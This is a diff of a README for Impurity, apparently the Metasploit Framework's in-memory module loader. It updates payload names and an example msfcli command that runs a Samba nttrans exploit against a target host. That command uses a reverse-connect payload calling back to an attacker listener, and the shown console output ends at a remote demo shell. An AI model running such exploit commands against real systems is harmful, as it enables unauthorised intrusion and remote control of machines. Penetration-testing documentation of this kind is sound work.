@@ -11,23 +11,27 @@ able to type "make" in this directory to compile the tracepath and
 shelldemo samples.
 
 To use an Impurity module, you must specify an Impurity-enabled
-payload (linx86reverse_imp) and use the PEXEC option to specify the
-path to your particular module. The NASM source code for the linux x86
+payload (linux_ia32_reverse_impurity) and use the PEXEC option to specify
+the path to your particular module. The NASM source code for the linux x86
 reverse-connect payload is included in this directory for reference.
 
-For example, to use the "shelldemo" module with the Samba trans2open
+For example, to use the "shelldemo" module with the Samba nttrans
 exploit, you would use a command line like the following:
 
+$ ./msfcli samba_nttrans TARGET=3 RHOST=192.168.0.252 PEXEC=data/shelldemo
+PAYLOAD=linux_ia32_reverse_impurity LHOST=192.168.0.20 E
+[*] Starting Reverse Handler.
+[*] Starting attack against target Samba 2.0.6 / Red Hat 6.2
+[*] Attack will use 1 threads with 1 total attempts
 
-$ ./msfcli 0x09 rhost=192.168.0.1 rport=139 lhost=192.168.0.247 \
-lport=34234 payload=linx86reverse_imp pexec=./impurity/shelldemo E
-[*] Starting handler impurity_reverse
-[*] Starting brute force mode...
-[*] Trying return address 0xbfffffdc
-[*] Trying return address 0xbfffebdc
-[*] Connection from 192.168.0.1:54990...
-[*] Uploading 14844 bytes... Done
-[*] Switching to impurity payload
+[*] Establishing 1 connection(s) to the target...
+[*] --- Setting up the SMB session...
+[*] --- Establishing tree connection...
+[*] --- Sending first nttrans component...
+[*] Got connection from 192.168.0.20:4321 <-> 192.168.0.252:1065
+[*] Sleeping before sending impurity data.
+[*] Uploading impurity data (17600), Please wait...
+[*] Executing impurity data.
 
 --=[ Impurity Demo Shell
-impurity demo > 
+impurity demo >
